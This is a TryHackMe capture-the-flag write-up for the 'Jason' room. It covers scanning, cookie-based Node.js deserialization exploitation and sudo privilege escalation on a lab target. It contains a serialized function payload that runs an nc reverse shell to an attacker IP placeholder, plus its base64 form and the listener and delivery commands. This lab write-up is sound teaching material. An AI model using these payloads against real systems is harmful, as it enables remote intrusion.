---
tags:
  - THM
  - Linux
  - Easy
  - Deserialization
  - RCE
  - Sudo
---
https://tryhackme.com/room/jason/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.77.170 jason.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC jason.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9a:33:cb:eb:ac:b0:7e:ab:7e:5c:32:20:8f:10:cb:be (RSA)
|   256 fc:cd:72:0f:40:7d:93:ea:36:2d:99:b9:2b:f2:f1:de (ECDSA)
|_  256 ed:fa:54:54:4c:7c:2b:21:bb:c1:b9:45:f1:fb:99:17 (ED25519)
80/tcp open  http
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Thu, 24 Jul 2025 21:03:55 GMT
|     Connection: close
|     <html><head>
|     <title>Horror LLC</title>
|     <style>
|     body {
|     background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);
|     background-size: 300% 300%;
|     -webkit-animation: Background 10s ease infinite;
|     -moz-animation: Background 10s ease infinite;
|     animation: Background 10s ease infinite;
|     @-webkit-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @-moz-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @keyframes Background {
|     background-position: 0% 50%
|     background-posi
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Thu, 24 Jul 2025 21:03:56 GMT
|     Connection: close
|     <html><head>
|     <title>Horror LLC</title>
|     <style>
|     body {
|     background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);
|     background-size: 300% 300%;
|     -webkit-animation: Background 10s ease infinite;
|     -moz-animation: Background 10s ease infinite;
|     animation: Background 10s ease infinite;
|     @-webkit-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @-moz-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @keyframes Background {
|     background-position: 0% 50%
|_    background-posi
|_http-title: Horror LLC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.97%I=7%D=7/24%Time=68829FBC%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,E4B,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html\r\nDat
SF:e:\x20Thu,\x2024\x20Jul\x202025\x2021:03:55\x20GMT\r\nConnection:\x20cl
SF:ose\r\n\r\n<html><head>\n<title>Horror\x20LLC</title>\n<style>\n\x20\x2
SF:0body\x20{\n\x20\x20\x20\x20background:\x20linear-gradient\(253deg,\x20
SF:#4a040d,\x20#3b0b54,\x20#3a343b\);\n\x20\x20\x20\x20background-size:\x2
SF:0300%\x20300%;\n\x20\x20\x20\x20-webkit-animation:\x20Background\x2010s
SF:\x20ease\x20infinite;\n\x20\x20\x20\x20-moz-animation:\x20Background\x2
SF:010s\x20ease\x20infinite;\n\x20\x20\x20\x20animation:\x20Background\x20
SF:10s\x20ease\x20infinite;\n\x20\x20}\n\x20\x20\n\x20\x20@-webkit-keyfram
SF:es\x20Background\x20{\n\x20\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\x2
SF:0background-position:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x20
SF:50%\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x20100%\x2050%\n
SF:\x20\x20\x20\x20}\n\x20\x20\x20\x20100%\x20{\n\x20\x20\x20\x20\x20\x20b
SF:ackground-position:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20}\n\x20\x2
SF:0\n\x20\x20@-moz-keyframes\x20Background\x20{\n\x20\x20\x20\x200%\x20{\
SF:n\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\x20\x2
SF:0\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x20\x20\x20\x20\x20background-po
SF:sition:\x20100%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x20100%\x20{\n\
SF:x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\x20\x20\
SF:x20}\n\x20\x20}\n\x20\x20\n\x20\x20@keyframes\x20Background\x20{\n\x20\
SF:x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x200%\
SF:x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x20\x20\x20\x
SF:20\x20background-posi")%r(HTTPOptions,E4B,"HTTP/1\.1\x20200\x20OK\r\nCo
SF:ntent-Type:\x20text/html\r\nDate:\x20Thu,\x2024\x20Jul\x202025\x2021:03
SF::56\x20GMT\r\nConnection:\x20close\r\n\r\n<html><head>\n<title>Horror\x
SF:20LLC</title>\n<style>\n\x20\x20body\x20{\n\x20\x20\x20\x20background:\
SF:x20linear-gradient\(253deg,\x20#4a040d,\x20#3b0b54,\x20#3a343b\);\n\x20
SF:\x20\x20\x20background-size:\x20300%\x20300%;\n\x20\x20\x20\x20-webkit-
SF:animation:\x20Background\x2010s\x20ease\x20infinite;\n\x20\x20\x20\x20-
SF:moz-animation:\x20Background\x2010s\x20ease\x20infinite;\n\x20\x20\x20\
SF:x20animation:\x20Background\x2010s\x20ease\x20infinite;\n\x20\x20}\n\x2
SF:0\x20\n\x20\x20@-webkit-keyframes\x20Background\x20{\n\x20\x20\x20\x200
SF:%\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20
SF:\x20\x20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x20\x20\x20\x20\x20backgr
SF:ound-position:\x20100%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x20100%\
SF:x20{\n\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\x
SF:20\x20\x20}\n\x20\x20}\n\x20\x20\n\x20\x20@-moz-keyframes\x20Background
SF:\x20{\n\x20\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\x20background-posi
SF:tion:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x
SF:20\x20\x20\x20\x20background-position:\x20100%\x2050%\n\x20\x20\x20\x20
SF:}\n\x20\x20\x20\x20100%\x20{\n\x20\x20\x20\x20\x20\x20background-positi
SF:on:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20}\n\x20\x20\n\x20\x20@keyf
SF:rames\x20Background\x20{\n\x20\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20
SF:\x20background-position:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\
SF:x2050%\x20{\n\x20\x20\x20\x20\x20\x20background-posi");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
The website is running Node.js:
```console
$ curl -s http://jason.thm/ | sed -z 's|<style>.*</style>||g'
<html><head>
<title>Horror LLC</title>

</head>
<body>
	<div class="full-screen">
  <div>
    <h1>Horror LLC</h1>
    <h4>Built with Nodejs</h4>
    <br>
    <h3>Coming soon! Please sign up to our newsletter to receive updates.</h3>
    <br>
    <h2>Email address:</h2>
    <input type="text" id="fname" name="fname"><br><br>
    <a class="button-line" id="signup">Submit</a> 
    <script>
    document.getElementById("signup").addEventListener("click", function() {
	var date = new Date();
    	date.setTime(date.getTime()+(-1*24*60*60*1000));
    	var expires = "; expires="+date.toGMTString();
    	document.cookie = "session=foobar"+expires+"; path=/";
    	const Http = new XMLHttpRequest();
        console.log(location);
        const url=window.location.href+"?email="+document.getElementById("fname").value;
        Http.open("POST", url);
        Http.send();
	setTimeout(function() {
		window.location.reload();
	}, 500);
    }); 
    </script>
  </div>
</div>


</body></html>
```
The website has a sign up option by sending an email. After analyzing its behavior between the `script` tags and using [Caido](https://caido.io/), we can observe that:
1. The user sends its email in plain text via POST.
2. The server responds with a base64-encoded JSON, which contains the user's email.
3. The user sets that value as a cookie and auto refreshes the page with JavaScript.
4. Now, the website can identify us by our cookie.

Since the website is running Node.js, we can guess that between steps 3 and 4, the data is being deserialized and processed by the server.
# Exploitation
First, we craft a serialized reverse shell and save it in `rev.json`:
> Remember to replace `<ATTACKER-IP>` and `<PORT>` with their corresponding value.
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f', function(error,stdout, stderr) { console.log(stdout) });}()"}
```
Then, we encode in base64 that serialized reverse shell:
```console
$ base64 -w 0 rev.json

eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygncm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDxBVFRBQ0tFUi1JUD4gPFBPUlQ+ID4vdG1wL2YnLCBmdW5jdGlvbihlcnJvcixzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9Cg==
```
Now, we wait for connections:
```bash
nc -lvnp <PORT>
```
Finally, we send a request to the server so that the data gets deserialized and that the reverse shell gets executed:
```bash
curl -s 'http://jason.thm' --cookie 'session=<YOUR-BASE64-DATA>'
```
Read the **user flag**:
```bash
cat /home/dylan/user.txt
```
# Post-Exploitation
The current user (**ubuntu**) can run any command using `sudo`:
```console
$ sudo -l

Matching Defaults entries for ubuntu on ip-10-10-77-170:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ubuntu may run the following commands on ip-10-10-77-170:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```
Become **root**:
```console
$ sudo -s su

# whoami
root
```
Read the **root flag**:
```bash
cat /root/root.txt
```